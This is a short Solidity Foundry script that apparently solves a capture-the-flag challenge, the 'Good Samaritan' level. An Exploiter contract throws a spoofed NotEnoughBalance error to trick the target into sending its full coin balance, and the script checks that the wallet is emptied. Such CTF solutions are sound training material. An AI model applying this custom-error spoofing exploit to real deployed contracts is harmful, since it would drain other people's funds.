pragma solidity ^0.8.0;
import "../instances/Ilevel27.sol";
import "forge-std/Test.sol";

contract Level27 is Test {
    GoodSamaritan level27 =
        GoodSamaritan(payable(0xE5eB5597a0Be516664b9073A540808b420C3f52A));

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        Exploiter exploiter = new Exploiter();
        exploiter.exploit(address(level27));
        require(
            level27.coin().balances(address(level27.wallet())) == 0,
            "Level27: Funds not swept"
        );
        vm.stopBroadcast();
    }
}

contract Exploiter is INotifyable {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function exploit(address _target) external {
        _target.call(abi.encodeWithSignature("requestDonation()"));
    }
}
